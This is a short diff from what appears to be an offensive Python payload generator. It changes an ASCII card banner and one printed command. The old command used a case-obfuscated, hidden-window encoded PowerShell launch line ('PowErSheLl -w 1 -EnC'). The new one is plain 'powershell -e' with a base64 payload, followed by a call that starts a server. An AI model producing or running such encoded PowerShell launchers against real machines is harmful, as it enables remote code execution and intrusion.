@@ -65,8 +65,8 @@ def JOKER():
 |{Yellow}J{Normal}.--. ||E.--. ||S.--. ||U.--. ||S.--. |
 | :(): || :/\: || :/\: || (\/) || :(): |
 | ()() || :\/: || :\/: || :\/: || ()() |
-| '--'C|| '--'H|| '--'R|| '--'I|| '-S'T|
-`-----'`------'`------'`------'`------' is love.''')
+| '--'C|| '--'H|| '--'R|| '--'I|| '--'S| T ❤️s You..
+`-----'`------'`------'`------'`------''')
 
 
 # ---------------------  UUIDS TO BE USED AFTER --------------------
@@ -435,7 +435,7 @@ def main():
     if args.r == "raw":
         Raw_Payload(x=FP)
     else:
-        print(f"PowErSheLl -w 1 -EnC {base_bytes_out.decode('utf-8')}")
+        print(f"powershell -e {base_bytes_out.decode('utf-8')}")
     time.sleep(0.5)
     start_server()
 
